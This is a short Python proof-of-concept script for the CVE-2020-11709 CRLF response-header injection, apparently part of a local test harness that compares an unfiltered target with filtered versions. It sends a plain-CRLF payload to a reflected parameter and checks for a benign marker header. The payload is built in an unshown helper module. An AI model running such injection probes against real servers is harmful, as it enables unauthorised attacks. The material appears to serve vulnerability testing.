#!/usr/bin/env python3
"""Original PoC (GIVEN) for the CVE-2020-11709 CRLF response-header injection.

Plain-CRLF payload against the reflected "x" param. Injects the benign marker
header X-Pcb-Inject: <PCB_FLAG> at V0 (no filter). The CVE-2020-11709 has_crlf
filter (V1) COVERS this exact form, so it is blocked at V1 and V2.

Usage: python3 original_poc.py <host> <port>   (defaults 127.0.0.1 18080 = V0)
"""
import sys
from oracle import send_raw, build_query, injected, MARKER

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 18080

raw = send_raw(host, port, build_query("original"))
ok = injected(raw)
print(f"[original/plain-CRLF] target={host}:{port} injected_marker={ok}")
print("----- raw response header block -----")
sys.stdout.write(raw.split(b"\r\n\r\n", 1)[0].decode("latin-1", "replace"))
print()
sys.exit(0 if ok else 1)
